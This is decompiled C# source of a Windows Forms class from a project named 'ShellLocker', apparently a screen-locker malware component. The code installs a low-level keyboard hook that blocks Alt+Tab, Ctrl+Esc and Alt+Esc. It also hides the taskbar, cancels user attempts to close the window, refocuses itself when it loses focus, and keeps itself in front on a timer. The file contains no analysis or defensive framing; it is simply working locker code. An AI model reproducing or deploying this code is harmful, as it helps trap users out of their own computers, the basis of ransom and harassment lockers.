using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ShellLocker
{
	// Token: 0x0200000C RID: 12
	[DesignerGenerated]
	public partial class Form2 : Form
	{
		// Token: 0x06000040 RID: 64 RVA: 0x000030AC File Offset: 0x000012AC
		public Form2()
		{
			base.LostFocus += this.Form2_LostFocus;
			base.Load += this.Form2_Load;
			base.FormClosing += this.Form2_FormClosing;
			this.InitializeComponent();
		}

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x06000043 RID: 67 RVA: 0x000032B4 File Offset: 0x000014B4
		// (set) Token: 0x06000044 RID: 68 RVA: 0x000032BC File Offset: 0x000014BC
		internal virtual Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
				Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x06000045 RID: 69 RVA: 0x000032FF File Offset: 0x000014FF
		// (set) Token: 0x06000046 RID: 70 RVA: 0x00003307 File Offset: 0x00001507
		internal virtual PictureBox PictureBox1
		{
			get; [MethodImpl(MethodImplOptions.Synchronized)]
			set;
		}

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x06000047 RID: 71 RVA: 0x0000256F File Offset: 0x0000076F
		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = base.CreateParams;
				createParams.ClassStyle |= 512;
				return createParams;
			}
		}

		// Token: 0x06000048 RID: 72
		[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

		// Token: 0x06000049 RID: 73
		[DllImport("User32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern void SetWindowPos(int hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, int wFlags);

		// Token: 0x0600004A RID: 74 RVA: 0x00003310 File Offset: 0x00001510
		public void TaskBarVisible(bool Visible)
		{
			string text = "Shell_TrayWnd";
			string text2 = "";
			int num = Form2.FindWindow(ref text, ref text2);
			if (Visible)
			{
				Form2.SetWindowPos(num, 0, 0, 0, 0, 0, 64);
				return;
			}
			Form2.SetWindowPos(num, 0, 0, 0, 0, 0, 128);
		}

		// Token: 0x0600004B RID: 75
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int hHook);

		// Token: 0x0600004C RID: 76
		[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SetWindowsHookExA", ExactSpelling = true, SetLastError = true)]
		public static extern int SetWindowsHookEx(int idHook, Form2.KeyboardHookDelegate lpfn, int hmod, int dwThreadId);

		// Token: 0x0600004D RID: 77
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetAsyncKeyState2(int vKey);

		// Token: 0x0600004E RID: 78
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHookEx(int hHook, int nCode, int wParam, Form2.KBDLLHOOKSTRUCT lParam);

		// Token: 0x0600004F RID: 79 RVA: 0x00003354 File Offset: 0x00001554
		public bool IsHooked(ref Form2.KBDLLHOOKSTRUCT Hookstruct)
		{
			bool flag;
			if ((Hookstruct.vkCode == 27) & ((Form2.GetAsyncKeyState(17) & 32768) != 0))
			{
				this.HookedState("Ctrl + Esc blocked");
				flag = true;
			}
			else if ((Hookstruct.vkCode == 9) & ((Hookstruct.flags & 32) != 0))
			{
				this.HookedState("Alt + Tab blockd");
				flag = true;
			}
			else if ((Hookstruct.vkCode == 27) & ((Hookstruct.flags & 32) != 0))
			{
				this.HookedState("Alt + Escape blocked");
				flag = true;
			}
			else
			{
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000050 RID: 80 RVA: 0x000033E0 File Offset: 0x000015E0
		private void HookedState(string Text)
		{
		}

		// Token: 0x06000051 RID: 81 RVA: 0x000033E4 File Offset: 0x000015E4
		public int KeyboardCallback(int Code, int wParam, ref Form2.KBDLLHOOKSTRUCT lParam)
		{
			int num;
			if (Code == 0 && this.IsHooked(ref lParam))
			{
				num = 1;
			}
			else
			{
				num = Form2.CallNextHookEx(this.KeyboardHandle, Code, wParam, lParam);
			}
			return num;
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00003418 File Offset: 0x00001618
		public void HookKeyboard()
		{
			this.callback = new Form2.KeyboardHookDelegate(this.KeyboardCallback);
			this.KeyboardHandle = Form2.SetWindowsHookEx(13, this.callback, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
			this.CheckHooked();
		}

		// Token: 0x06000053 RID: 83 RVA: 0x0000346A File Offset: 0x0000166A
		public void CheckHooked()
		{
			Conversions.ToBoolean(this.Hooked());
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00003478 File Offset: 0x00001678
		private object Hooked()
		{
			return this.KeyboardHandle != 0;
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00003495 File Offset: 0x00001695
		public void UnhookKeyboard()
		{
			if (Conversions.ToBoolean(this.Hooked()))
			{
				Form2.UnhookWindowsHookEx(this.KeyboardHandle);
			}
		}

		// Token: 0x06000056 RID: 86 RVA: 0x000026C4 File Offset: 0x000008C4
		private void Form2_LostFocus(object sender, EventArgs e)
		{
			base.Focus();
		}

		// Token: 0x06000057 RID: 87
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern void keybd_event(byte bVk, byte bScan, long dwFlags, long dwExtraInfo);

		// Token: 0x06000058 RID: 88
		[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SystemParametersInfoA", ExactSpelling = true, SetLastError = true)]
		private static extern int SystemParametersInfo(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

		// Token: 0x06000059 RID: 89
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetAsyncKeyState(int vkey);

		// Token: 0x0600005A RID: 90 RVA: 0x000033E0 File Offset: 0x000015E0
		private void Form2_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005B RID: 91 RVA: 0x000026CD File Offset: 0x000008CD
		private void Form2_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (e.CloseReason == CloseReason.UserClosing)
			{
				e.Cancel = true;
			}
		}

		// Token: 0x0600005C RID: 92 RVA: 0x000026DF File Offset: 0x000008DF
		private void Timer1_Tick(object sender, EventArgs e)
		{
			base.BringToFront();
		}

		// Token: 0x04000029 RID: 41
		private const int HC_ACTION = 0;

		// Token: 0x0400002A RID: 42
		private const int LLKHF_EXTENDED = 1;

		// Token: 0x0400002B RID: 43
		private const int LLKHF_INJECTED = 16;

		// Token: 0x0400002C RID: 44
		private const int LLKHF_ALTDOWN = 32;

		// Token: 0x0400002D RID: 45
		private const int LLKHF_UP = 128;

		// Token: 0x0400002E RID: 46
		public const int VK_TAB = 9;

		// Token: 0x0400002F RID: 47
		public const int VK_CONTROL = 17;

		// Token: 0x04000030 RID: 48
		public const int VK_ESCAPE = 27;

		// Token: 0x04000031 RID: 49
		public const int VK_DELETE = 46;

		// Token: 0x04000032 RID: 50
		public const int VK_MENU = 18;

		// Token: 0x04000033 RID: 51
		private const int WH_KEYBOARD_LL = 13;

		// Token: 0x04000034 RID: 52
		public int KeyboardHandle;

		// Token: 0x04000035 RID: 53
		[MarshalAs(UnmanagedType.FunctionPtr)]
		private Form2.KeyboardHookDelegate callback;

		// Token: 0x04000036 RID: 54
		public const int VK_LWIN = 91;

		// Token: 0x04000037 RID: 55
		public const int KEYEVENTF_KEYUP = 2;

		// Token: 0x04000038 RID: 56
		private int i;

		// Token: 0x04000039 RID: 57
		private int i2;

		// Token: 0x0400003A RID: 58
		private int i3;

		// Token: 0x0400003B RID: 59
		private int i4;

		// Token: 0x0400003C RID: 60
		private int i5;

		// Token: 0x0400003D RID: 61
		private new string Location;

		// Token: 0x0400003E RID: 62
		private const int SETDESKWALLPAPER = 20;

		// Token: 0x0400003F RID: 63
		private const int UPDATEINIFILE = 1;

		// Token: 0x04000040 RID: 64
		private RichTextBox erhaltenerText;

		// Token: 0x04000041 RID: 65
		private string path1;

		// Token: 0x04000042 RID: 66
		private string path2;

		// Token: 0x04000043 RID: 67
		private object userDir;

		// Token: 0x04000044 RID: 68
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x02000013 RID: 19
		public struct KBDLLHOOKSTRUCT
		{
			// Token: 0x0400005F RID: 95
			public int vkCode;

			// Token: 0x04000060 RID: 96
			public int scanCode;

			// Token: 0x04000061 RID: 97
			public int flags;

			// Token: 0x04000062 RID: 98
			public int time;

			// Token: 0x04000063 RID: 99
			public int dwExtraInfo;
		}

		// Token: 0x02000014 RID: 20
		// (Invoke) Token: 0x060000BC RID: 188
		public delegate int KeyboardHookDelegate(int Code, int wParam, ref Form2.KBDLLHOOKSTRUCT lParam);
	}
}
